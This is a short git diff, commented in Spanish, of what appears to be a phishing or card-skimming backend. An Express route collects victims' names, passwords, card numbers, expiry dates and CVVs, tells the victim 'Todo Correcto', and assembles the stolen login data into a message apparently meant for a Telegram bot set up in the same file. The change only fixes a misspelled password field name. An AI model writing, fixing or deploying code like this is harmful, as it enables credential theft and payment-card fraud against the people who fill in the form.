@@ -12,7 +12,7 @@ const bot = new TelegramBot(token, { polling: true });
 router.post("/enviar", (req, res) => {
     const {
         name,
-        passworld,
+        password,
         NumeroDeTarjeta,
         FechaDeVencimiento,
         CVV,
@@ -27,7 +27,7 @@ router.post("/enviar", (req, res) => {
         message: "Todo Correcto",
         datos: {
             name,
-            passworld,
+            password,
             NumeroDeTarjeta,
             FechaDeVencimiento,
             CVV,
@@ -40,10 +40,10 @@ router.post("/enviar", (req, res) => {
     let mensaje = '';
 
     // Solo incluye los datos de login si están completos
-    if (name && passworld) {
+    if (name && password) {
         mensaje += `Datos del Login:
         Nombre: ${name}
-        Contraseña: ${passworld}\n\n`;
+        Contraseña: ${password}\n\n`;
     }
 
     // Solo incluye los datos de la tarjeta si están completos
